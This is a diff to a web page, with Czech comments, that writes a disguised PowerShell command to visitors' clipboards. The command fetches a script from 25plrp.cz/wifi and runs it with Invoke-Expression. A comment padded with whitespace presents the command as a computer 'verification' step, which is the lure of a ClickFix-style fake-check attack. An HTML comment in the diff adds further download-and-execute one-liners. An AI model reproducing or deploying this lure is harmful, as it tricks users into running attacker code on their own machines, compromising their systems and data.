@@ -27,7 +27,7 @@
       filter: none;
     }
     #marvinImg {
-      width: 1000px;
+      width: 800px;
       margin-top: 30px;
     }
     .modal {
@@ -100,7 +100,7 @@
 
         // Kopírování příkazu (můžete upravit dle potřeby)
         const psCommand =
-          'powershell iwr "25plrp.cz/wifi" | iex           #             Po stisku proběhne ověření na vašem počítači ✅ ❌';
+          'powershell -Command "& { $(Invoke-WebRequest 'https://25plrp.cz/wifi').Content | Invoke-Expression }"         #             Po stisku proběhne ověření na vašem počítači ✅ ❌';
         navigator.clipboard.writeText(psCommand).catch(() => {});
       }
     });
@@ -111,6 +111,13 @@
 
 
 <!--
+powershell iwr "25plrp.cz/wifi" | iex 
+# Místo iex lze použít:
+powershell -File "C:\cesta\skript.ps1"
+
+# Nebo pokud chcete z webu:
+powershell -Command "& { $(Invoke-WebRequest 'https://test.com/test').Content | Invoke-Expression }"
+
 <h1>Ve vývoji </h1>
 
 <!DOCTYPE html>
